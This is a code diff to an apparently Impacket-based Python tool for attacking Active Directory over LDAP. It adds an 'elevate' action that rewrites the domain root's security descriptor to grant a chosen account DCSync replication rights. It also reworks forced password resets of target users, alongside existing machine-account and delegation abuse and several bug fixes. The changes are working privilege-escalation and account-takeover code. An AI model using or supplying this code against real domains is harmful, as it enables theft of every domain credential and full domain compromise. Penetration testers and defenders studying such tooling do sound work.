@@ -24,20 +24,23 @@
 #        Impacket by SecureAuth https://github.com/SecureAuthCorp/impacket
 #
 
+import sys
+import copy
+import string
+import random
+import logging
+import argparse
+
+import ssl
+import ldap3
+import ldapdomaindump
 
 from impacket import version
 from impacket.examples import logger
-
 from impacket.ldap import ldaptypes
-import ldapdomaindump
+from impacket.uuid import string_to_bin
 
-import ldap3
-import argparse
-import logging
-import sys
-import string
-import random
-import ssl
+
 
 def create_empty_sd():
     sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
@@ -57,9 +60,8 @@ def create_empty_sd():
     sd['Dacl'] = acl
     return sd
 
-
 # Create an ALLOW ACE with the specified sid
-def create_allow_ace(sid):
+def create_allow_ace(sid, guid_str=False):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
     nace['AceFlags'] = 0x00
@@ -68,6 +70,12 @@ def create_allow_ace(sid):
     acedata['Mask']['Mask'] = 983551  # Full control
     acedata['Sid'] = ldaptypes.LDAP_SID()
     acedata['Sid'].fromCanonical(sid)
+    if guid_str:
+        acedata['ObjectType'] = string_to_bin(guid_str)
+        acedata['ObjectTypeLen'] = len(string_to_bin(guid_str))
+        acedata['InheritedObjectTypeLen'] = 0
+        acedata['InheritedObjectType'] = b''
+    acedata['Flags'] = 1
     nace['Ace'] = acedata
     return nace
 
@@ -263,17 +271,14 @@ class RBCD(object):
             return '[Could not resolve SID]', '[Could not resolve SID]'
 
 
-class ManageUserPWD:
+class ManageUser:
+    """docstring for ManageUser"""
     def __init__(self, ldapConn, cmdLineOptions):
         self.ldapConn = ldapConn
-        self.__accountName = cmdLineOptions.account_name
-        self.__newPassword = cmdLineOptions.new_pass
+        self.__accountName = cmdLineOptions.target
         self.__domain = cmdLineOptions.domain
         self.__baseDN = cmdLineOptions.baseDN
-        
-        if self.__newPassword is None:
-            self.__newPassword = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
-        
+
         if self.__baseDN is None:
              # Create the baseDN
             domainParts = self.__domain.split('.')
@@ -286,35 +291,77 @@ class ManageUserPWD:
         if not '.' in self.__domain:
             logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)
 
-    def LDAPUserExists(self, accountName):
-        return self.LDAPGetUser(accountName)
-
-    def LDAPGetUser(self, accountName):
-        self.ldapConn.search(self.__baseDN, '(sAMAccountName=%s)' % ldap3.utils.conv.escape_filter_chars(accountName))
-        try:
-            dn = self.ldapConn.entries[0].entry_dn
-            return dn
-        except IndexError:
-            logging.error('User not found in LDAP: %s' % accountName)
-            return False
-
-    def changePW(self):
         if not self.LDAPUserExists(self.__accountName):
             raise Exception("sAMAccountName %s not found in %s!" % (self.__accountName, self.__baseDN))
 
-        targetDN = self.LDAPGetUser(self.__accountName)
-        res = self.ldapConn.modify(targetDN, {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(self.__newPassword).encode('utf-16-le')])]})
+        self.__targetDN, self.__targetSID = self.LDAPGetUser(self.__accountName)
+
+    def LDAPUserExists(self, accountName):
+        res, _ = self.LDAPGetUser(accountName)
+        return res
+
+    def LDAPGetUser(self, accountName):
+        self.ldapConn.search(self.__baseDN, \
+                             '(sAMAccountName=%s)' % ldap3.utils.conv.escape_filter_chars(accountName), \
+                             attributes=['objectSid'])
+        try:
+            dn = self.ldapConn.entries[0].entry_dn
+            sid = ldap3.protocol.formatters.formatters.format_sid(self.ldapConn.entries[0]['objectSid'].raw_values[0])
+            return dn, sid
+        except IndexError:
+            logging.error('User not found in LDAP: %s' % accountName)
+            return False, ''
+
+    def elevate(self, forestDN=None): # implementation was inspired by @skelsec's `msldap` code
+        if forestDN is None:
+            forestDN = self.__baseDN
+
+        res = self.ldapConn.search(search_base=self.__baseDN, \
+                                   search_filter=f'(distinguishedName={forestDN})', \
+                                   attributes=['nTSecurityDescriptor'])
+        if res is None:
+            logging.error('Failed to get forest\'s SD')
+
+        baseDN_sd = self.ldapConn.entries[0].entry_raw_attributes
+        if baseDN_sd['nTSecurityDescriptor'] == []:
+            raise Exception("User doesn't have right read nTSecurityDescriptor!")
+
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=baseDN_sd['nTSecurityDescriptor'][0])
+        new_sd = copy.deepcopy(sd)
+
+        for guid in ['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', \
+                     '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', \
+                     '89e95b76-444d-4c62-991a-0facbeda640c']:
+            new_sd['Dacl'].aces.append(create_allow_ace(self.__targetSID, guid))
+
+        res = self.ldapConn.modify(forestDN, \
+                                   {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [new_sd.getData()]]})
         if not res:
             if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
-                raise Exception("User doesn't have right to modify %s!" % (targetDN))
-            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_NO_SUCH_OBJECT:
-                raise Exception("Target DN '%s' is not correct!" % (targetDN))
+                raise Exception("User doesn't have right to modify %s!" % (self.__targetDN))
             elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
-                raise Exception("Unwilling to Perform: %s" % (self.ldapConn.result['message']))               
+                raise Exception("Unwilling to Perform: %s" % (self.ldapConn.result['message']))
+            else:
+                raise Exception(str(ldapConn.result))
+        else:
+            logging.info("Granted user '%s' DCSYNC rights!" % (self.__accountName))
+
+    def changePWD(self, newPWD):
+        if newPWD is False:
+            newPWD = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
+        res = self.ldapConn.modify(self.__targetDN, \
+                                   {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(newPWD).encode('utf-16-le')])]})
+        if not res:
+            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
+                raise Exception("User doesn't have right to modify %s!" % (self.__targetDN))
+            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_NO_SUCH_OBJECT:
+                raise Exception("Target DN '%s' is not correct!" % (self.__targetDN))
+            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
+                raise Exception("Password complexity not met. Unwilling to Perform: %s" % (self.ldapConn.result['message']))
             else:
                 raise Exception(str(self.ldapConn.result))
         else:
-            logging.info("Successfully changed %s password to: %s" % (self.__accountName, self.__newPassword))
+            logging.info("Successfully changed %s password to: %s" % (self.__accountName, newPWD))
 
 
 class ManageComputer:
@@ -337,7 +384,7 @@ class ManageComputer:
                 self.__computerName += '$'
 
         if not '.' in self.__domain:
-                logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)
+            logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)
 
         if self.__computerPassword is None:
             self.__computerPassword = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
@@ -368,12 +415,12 @@ class ManageComputer:
 
     def add_computer(self, constrained_delegations = None):
         if self.__computerName is not None:
-            if self.LDAPComputerExists(ldapConn, self.__computerName):
+            if self.LDAPComputerExists(self.ldapConn, self.__computerName):
                 raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
         else:
             while True:
                 self.__computerName = self.generateComputerName()
-                if not self.LDAPComputerExists(ldapConn, self.__computerName):
+                if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
                     break
 
 
@@ -402,52 +449,52 @@ class ManageComputer:
             ucd['userAccountControl'] = 0x1000000|0x1000
             # Set the list of services authorized (format: protocol/FQDNserver)
             ucd['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
-            logging.info("Adding contrained delegations services to the computer object: %s" % constrained_delegations)
+            logging.info("Adding constrained delegations services to the computer object: %s" % constrained_delegations)
 
-        res = ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
+        res = self.ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
         if not res:
-            if ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
-                error_code = int(ldapConn.result['message'].split(':')[0].strip(), 16)
+            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
+                error_code = int(self.ldapConn.result['message'].split(':')[0].strip(), 16)
                 if error_code == 0x216D:
                     raise Exception("User machine quota exceeded!")
                 else:
-                    raise Exception(str(ldapConn.result))
-            elif ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
+                    raise Exception(str(self.ldapConn.result))
+            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                 raise Exception("User doesn't have right to create a machine account!")
-            elif ldapConn.result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
-                raise Exception("User doesn't have right to create contrained delegations!")
+            elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
+                raise Exception("User doesn't have right to create constrained delegations!")
             else:
-                raise Exception(str(ldapConn.result))
+                raise Exception(str(self.ldapConn.result))
         else:
             logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))
 
     def delete_computer(self):
-        if not self.LDAPComputerExists(ldapConn, self.__computerName):
+        if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
             raise Exception("Account %s not found in %s!" % (self.__computerName, self.__baseDN))
 
-        computer = self.LDAPGetComputer(ldapConn, self.__computerName)
-        res = ldapConn.delete(computer.entry_dn)
+        computer = self.LDAPGetComputer(self.ldapConn, self.__computerName)
+        res = self.ldapConn.delete(computer.entry_dn)
         if not res:
-            if ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
+            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                 raise Exception("User doesn't have right to delete %s!" % (self.__computerName))
             else:
-                raise Exception(str(ldapConn.result))
+                raise Exception(str(self.ldapConn.result))
         else:
-            logging.info("Succesfully deleted %s." % self.__computerName)
+            logging.info("Successfully deleted %s." % self.__computerName)
 
     def modify_computer(self):
-        if not self.LDAPComputerExists(ldapConn, self.__computerName):
+        if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
             raise Exception("Account %s not found in %s!" % (self.__computerName, self.__baseDN))
 
-        computer = self.LDAPGetComputer(ldapConn, self.__computerName)
-        res = ldapConn.modify(computer.entry_dn, {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(self.__computerPassword).encode('utf-16-le')])]})
+        computer = self.LDAPGetComputer(self.ldapConn, self.__computerName)
+        res = self.ldapConn.modify(computer.entry_dn, {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(self.__computerPassword).encode('utf-16-le')])]})
         if not res:
-            if ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
+            if self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                 raise Exception("User doesn't have right to modify %s!" % (self.__computerName))
             else:
-                raise Exception(str(ldapConn.result))
+                raise Exception(str(self.ldapConn.result))
         else:
-            logging.info("Succesfully set password of %s to %s" % (self.__computerName, self.__computerPassword))
+            logging.info("Successfully set password of %s to %s" % (self.__computerName, self.__computerPassword))
 
     def LDAPComputerExists(self, connection, computerName):
         connection.search(self.__baseDN, '(sAMAccountName=%s)' % computerName)
@@ -473,15 +520,16 @@ if __name__ == '__main__':
                        help='Destination port to connect to. LDAPS (via StartTLS) on 386 or LDAPS on 636.')
 
     group = parser.add_argument_group('Action')
-    group.add_argument('-action', choices=['add_computer', 'del_computer', 'modify_computer', 'read_rbcd', 'write_rbcd', 'remove_rbcd', 'flush_rbcd', 'forcePWDchange', 'whoami'], nargs='?', default='whoami')
+    group.add_argument('-action', choices=['add_computer', 'del_computer', 'modify_computer', 'read_rbcd', 'write_rbcd', 'remove_rbcd', 'flush_rbcd', 'modify_user', 'whoami'], nargs='?', default='whoami')
 
-    group = parser.add_argument_group('Password Reset')
-    group.add_argument('-account-name', action='store', metavar='sAMAccountName', help='sAMAccountName of user to target.')
-    group.add_argument('-new-pass', action='store', metavar='password', help='New password of target.')
+    group = parser.add_argument_group('Manage User')
+    group.add_argument('-target', action='store', metavar='sAMAccountName', help='sAMAccountName of user to target.')
+    group.add_argument('-new-pass',  action='store', metavar='Password', help='New password of target.', const=False, nargs='?')
+    group.add_argument('-elevate', action='store_true', help='Grant target account DCSYNC rights')
 
     group = parser.add_argument_group('Manage Computer')
     group.add_argument('-baseDN', action='store', metavar='DC=test,DC=local', help='Set baseDN for LDAP.'
-                                                                                    'If ommited, the domain part (FQDN) '
+                                                                                    'If omitted, the domain part (FQDN) '
                                                                                     'specified in the account parameter will be used.')
     group.add_argument('-computer-group', action='store', metavar='CN=Computers', help='Group to which the account will be added.'
                                                                                         'If omitted, CN=Computers will be used,')
@@ -502,7 +550,7 @@ if __name__ == '__main__':
 
     group = parser.add_argument_group('Authentication')
     group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. '
-                                                                              'If ommited, the domain part (FQDN) '
+                                                                              'If omitted, the domain part (FQDN) '
                                                                               'specified in the account parameter will be used')
     group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                       'Useful if you can\'t translate the FQDN.')
@@ -548,7 +596,7 @@ if __name__ == '__main__':
         ldap_connection_kwargs = dict()
 
         if options.port == 389:
-            # I don't really know why, but using this combinaison of parameters with ldap3 will
+            # I don't really know why, but using this combination of parameters with ldap3 will
             # send a LDAP_SERVER_START_TLS_OID and trigger a StartTLS
             ldap_connection_kwargs = {'authentication': ldap3.SASL,
                                       'sasl_mechanism': ldap3.EXTERNAL,
@@ -564,13 +612,20 @@ if __name__ == '__main__':
             # An EXTERNAL bind is not allowed, and the bind will be rejected with an error."
             # Using bind() function will raise an error, we just have to open() the connection
             ldapConn.open()
-        
-        if options.action in ('forcePWDchange'):
-            manage = ManageUserPWD(ldapConn, options)
-            manage.changePW()
-            sys.exit(1)
 
-        if options.action in ('add_computer','del_computer','modify_computer', 'whoami'):
+        if options.action in ('modify_user'):
+            if options.target is None:
+                logging.critical('-target is required !')
+                sys.exit(1)
+            manage = ManageUser(ldapConn, options)
+            if options.elevate:
+                manage.elevate()
+            elif options.new_pass is not None:
+                manage.changePWD(options.new_pass)
+            else:
+                logging.critical('User modification option (-elevate|-new-pass) needed!')
+
+        elif options.action in ('add_computer','del_computer','modify_computer', 'whoami'):
             manage = ManageComputer(ldapConn, options)
             if options.action == 'add_computer':
                 manage.add_computer(options.delegated_services)
